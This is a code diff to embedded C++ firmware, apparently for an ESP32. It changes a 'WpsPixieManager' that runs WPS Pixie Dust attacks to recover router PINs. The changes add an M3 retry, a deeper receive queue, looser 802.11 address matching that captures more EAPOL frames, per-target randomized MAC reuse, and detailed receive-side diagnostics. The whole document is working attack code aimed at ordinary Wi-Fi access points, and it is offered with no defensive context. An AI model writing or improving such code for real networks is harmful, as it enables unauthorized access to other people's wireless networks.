@@ -17,7 +17,10 @@ namespace {
 
 constexpr uint32_t WPS_PIXIE_TIMEOUT_MS = 35000;
 constexpr uint32_t WPS_M3_TIMEOUT_MS = 10000;
+constexpr uint32_t WPS_M3_RETRY_AFTER_MS = 3000;
+constexpr uint8_t WPS_M3_MAX_RETRIES = 1;
 constexpr uint32_t WPS_M1_TIMEOUT_MS = 10000;
+constexpr UBaseType_t WPS_RX_QUEUE_DEPTH = 32;
 constexpr uint32_t WPS_RECOVERED_PIN_TIMEOUT_MS = 30000;
 constexpr uint32_t WPS_WSC_DONE_TIMEOUT_MS = 5000;
 constexpr uint32_t WPS_RADIO_SETTLE_MS = 150;
@@ -156,7 +159,7 @@ bool WpsPixieManager::startAttempt(
         return false;
     }
     if (rxQueue_ == nullptr) {
-        rxQueue_ = xQueueCreate(12, sizeof(RxFrame));
+        rxQueue_ = xQueueCreate(WPS_RX_QUEUE_DEPTH, sizeof(RxFrame));
         if (rxQueue_ == nullptr) {
             error = "wps_pixie_queue_failed";
             return false;
@@ -171,8 +174,8 @@ bool WpsPixieManager::startAttempt(
     // Keep one stable randomized MAC per target campaign while firmware is
     // running. A new target gets a new MAC. This lets the pre-association
     // cleanup target the AP state left by the previous raw association.
-    (void)reuseMac;
-    reuseMac_ = reusableMacValid_ &&
+    reuseMac_ = reuseMac &&
+        reusableMacValid_ &&
         std::memcmp(reusableMacBssid_, targetBssid_, 6) == 0;
     resultSent_ = false;
     associated_ = false;
@@ -210,6 +213,24 @@ bool WpsPixieManager::startAttempt(
     lastM3EapId_ = 0;
     lockCheckStartedMs_ = 0;
     lockSeenMs_ = 0;
+    m3RetryCount_ = 0;
+    rxEapolSeen_ = 0;
+    rxEapolQueued_ = 0;
+    rxEapolDropped_ = 0;
+    rxEapolParsed_ = 0;
+    rxM1Count_ = 0;
+    rxM2DCount_ = 0;
+    rxM3Count_ = 0;
+    rxM5Count_ = 0;
+    rxM7Count_ = 0;
+    rxAckCount_ = 0;
+    rxNackCount_ = 0;
+    lastRxMs_ = 0;
+    lastRxEapolLength_ = 0;
+    lastRxEapCode_ = 0;
+    lastRxEapId_ = 0;
+    lastRxWpsMessage_ = 0;
+    lastRxFlags_ = 0;
     state_ = State::StartPending;
     emitProgress("prepare", "WPS attempt accepted; preparing radio");
     return true;
@@ -426,11 +447,24 @@ void WpsPixieManager::update() {
         return;
     }
 
-    if (state_ == State::WaitM3 &&
-        m3WaitStartedMs_ != 0 &&
-        millis() - m3WaitStartedMs_ > WPS_M3_TIMEOUT_MS) {
-        fail("m3_timeout", "No M3 received within 10 seconds; pin may be invalid or AP may be WPS locked");
-        return;
+    if (state_ == State::WaitM3 && m3WaitStartedMs_ != 0) {
+        const uint32_t waitedMs = millis() - m3WaitStartedMs_;
+        if (waitedMs > WPS_M3_RETRY_AFTER_MS && m3RetryCount_ < WPS_M3_MAX_RETRIES) {
+            ++m3RetryCount_;
+            emitProgress(
+                "m3-retry",
+                "M3 not observed; restarting WPS association once");
+            fragmentActive_ = false;
+            lastFragmentLength_ = 0;
+            haveLastWscRequest_ = false;
+            lastWscReplyLength_ = 0;
+            startRawAssociation();
+            return;
+        }
+        if (waitedMs > WPS_M3_TIMEOUT_MS) {
+            fail("m3_timeout", "No M3 received within 10 seconds; pin may be invalid or AP may be WPS locked");
+            return;
+        }
     }
 
     if ((state_ == State::WaitIdentity || state_ == State::WaitM1) &&
@@ -457,6 +491,9 @@ bool WpsPixieManager::startRawAssociation() {
 
     startedMs_ = millis();
     lastActivityMs_ = startedMs_;
+    m1WaitStartedMs_ = 0;
+    m3WaitStartedMs_ = 0;
+    lastEapolTxMs_ = 0;
     state_ = State::WaitAuthResponse;
     emitProgress("associate", "Starting raw WPS registrar association");
     if (!sendAuthenticationRequest()) {
@@ -473,6 +510,30 @@ void WpsPixieManager::emitProgress(const char* stage, const String& message) {
     doc["stage"] = stage;
     doc["message"] = message;
     proto_->sendEvent("wps_pixie_progress", doc);
+}
+
+void WpsPixieManager::appendRxDiagnostics(JsonDocument& doc) const {
+    doc["station_mac"] = macToString(stationMac_);
+    doc["target_bssid"] = macToString(targetBssid_);
+    doc["channel"] = channel_;
+    doc["m3_retries"] = m3RetryCount_;
+    doc["rx_eapol_seen"] = rxEapolSeen_;
+    doc["rx_eapol_queued"] = rxEapolQueued_;
+    doc["rx_eapol_dropped"] = rxEapolDropped_;
+    doc["rx_eapol_parsed"] = rxEapolParsed_;
+    doc["rx_m1"] = rxM1Count_;
+    doc["rx_m2d"] = rxM2DCount_;
+    doc["rx_m3"] = rxM3Count_;
+    doc["rx_m5"] = rxM5Count_;
+    doc["rx_m7"] = rxM7Count_;
+    doc["rx_ack"] = rxAckCount_;
+    doc["rx_nack"] = rxNackCount_;
+    doc["last_rx_ms"] = lastRxMs_;
+    doc["last_rx_eapol_len"] = lastRxEapolLength_;
+    doc["last_rx_eap_code"] = lastRxEapCode_;
+    doc["last_rx_eap_id"] = lastRxEapId_;
+    doc["last_rx_wps_message"] = lastRxWpsMessage_;
+    doc["last_rx_flags"] = lastRxFlags_;
 }
 
 void WpsPixieManager::emitWrongPin(bool firstHalfValid, bool firstHalfKnown, bool m3Only) {
@@ -523,6 +584,7 @@ void WpsPixieManager::emitError(const char* code, const String& message) {
     doc["run_id"] = runId_;
     doc["code"] = code;
     doc["message"] = message;
+    appendRxDiagnostics(doc);
     proto_->sendEvent("wps_pixie_error", doc);
 }
 
@@ -817,15 +879,27 @@ void WpsPixieManager::promiscuousCallback(void* buffer, wifi_promiscuous_pkt_typ
     }
 
     if (!data || type != WIFI_PKT_DATA) return;
-    if ((frame[1] & 0x02) == 0) return;
     size_t headerLength = kWlanHeaderLength;
     if ((frame[0] & 0x80) != 0) headerLength += 2;
     if ((frame[1] & 0x80) != 0) headerLength += 4;
     if (length < headerLength + kLlcSnapLength + 4) return;
-    if (std::memcmp(frame + 4, stationMac_, 6) != 0 ||
-        std::memcmp(frame + 10, targetBssid_, 6) != 0) {
-        return;
-    }
+
+    // Accept either direction by checking the station/BSSID roles across the
+    // three 802.11 address fields. Previous strict addr1/addr2 ordering could
+    // discard valid EAPOL frames with unusual QoS/DS header combinations.
+    const uint8_t* addr1 = frame + 4;
+    const uint8_t* addr2 = frame + 10;
+    const uint8_t* addr3 = frame + 16;
+    const bool stationMatch =
+        std::memcmp(addr1, stationMac_, 6) == 0 ||
+        std::memcmp(addr2, stationMac_, 6) == 0 ||
+        std::memcmp(addr3, stationMac_, 6) == 0;
+    const bool bssidMatch =
+        std::memcmp(addr1, targetBssid_, 6) == 0 ||
+        std::memcmp(addr2, targetBssid_, 6) == 0 ||
+        std::memcmp(addr3, targetBssid_, 6) == 0;
+    if (!stationMatch || !bssidMatch) return;
+
     const uint8_t snap[] = {0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e};
     if (std::memcmp(frame + headerLength, snap, sizeof(snap)) != 0) return;
     const uint8_t* eapol = frame + headerLength + kLlcSnapLength;
@@ -833,10 +907,16 @@ void WpsPixieManager::promiscuousCallback(void* buffer, wifi_promiscuous_pkt_typ
     if (available < 4) return;
     const size_t eapolLength = 4 + readBe16(eapol + 2);
     if (eapolLength > available || eapolLength > sizeof(item.data)) return;
+    ++rxEapolSeen_;
+    lastRxEapolLength_ = static_cast<uint16_t>(eapolLength);
     item.management = false;
     item.length = static_cast<uint16_t>(eapolLength);
     std::memcpy(item.data, eapol, eapolLength);
-    xQueueSend(rxQueue_, &item, 0);
+    if (xQueueSend(rxQueue_, &item, 0) == pdPASS) {
+        ++rxEapolQueued_;
+    } else {
+        ++rxEapolDropped_;
+    }
 }
 
 void WpsPixieManager::drainQueue() {
@@ -999,6 +1079,19 @@ void WpsPixieManager::processEapol(const uint8_t* data, size_t length) {
 
     EapWscFrame wire{};
     if (parseEapolWsc(data, length, wire)) {
+        ++rxEapolParsed_;
+        lastRxMs_ = millis();
+        lastRxEapCode_ = wire.eap_code;
+        lastRxEapId_ = wire.eap_id;
+        lastRxFlags_ = wire.flags;
+        if (wire.opcode == kWscOpNack) {
+            ++rxNackCount_;
+            lastRxWpsMessage_ = 0x0e;
+        } else if (wire.opcode == WSC_OP_ACK) {
+            ++rxAckCount_;
+        } else if (wire.opcode == WSC_OP_DONE) {
+            lastRxWpsMessage_ = 0x0d;
+        }
         if (wire.eap_code != 0x01) return;
         if (wire.opcode == kWscOpNack) {
             handleWscNack(wire);
@@ -1029,6 +1122,20 @@ void WpsPixieManager::processEapol(const uint8_t* data, size_t length) {
         if (!attributes.parse(wsc.wps_data, wsc.wps_length)) {
             fail("wsc_invalid", "Malformed WPS attribute stream");
             return;
+        }
+        const WpsAttribute* messageTypeAttr = attributes.find(ATTR_MESSAGE_TYPE);
+        if (messageTypeAttr != nullptr &&
+            messageTypeAttr->length == 1 &&
+            messageTypeAttr->value != nullptr) {
+            lastRxWpsMessage_ = messageTypeAttr->value[0];
+            switch (lastRxWpsMessage_) {
+                case MSG_M1: ++rxM1Count_; break;
+                case MSG_M2D: ++rxM2DCount_; break;
+                case MSG_M3: ++rxM3Count_; break;
+                case MSG_M5: ++rxM5Count_; break;
+                case MSG_M7: ++rxM7Count_; break;
+                default: break;
+            }
         }
         if (haveLastWscRequest_ &&
             wsc.wps_length == lastWscRequestLength_ &&
